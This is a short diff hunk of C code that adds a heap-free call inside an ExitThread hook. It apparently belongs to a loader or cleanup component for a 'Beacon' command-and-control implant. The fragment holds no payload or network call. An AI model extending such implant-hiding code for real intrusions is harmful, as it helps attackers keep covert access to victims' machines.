@@ -91,6 +91,7 @@ D_SEC( D ) VOID WINAPI ExitThread_Hook( _In_ DWORD ExitCode )
 	/* Free the memory allocated by Beacon */
 	Img = Tbl->Table->RxBuffer;
 	Len = 0;
+	Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Tbl->Table );
 
 	/* Acquire the current frame address */
 	Ctx.ContextFlags = CONTEXT_FULL; Api.RtlCaptureContext( &Ctx );
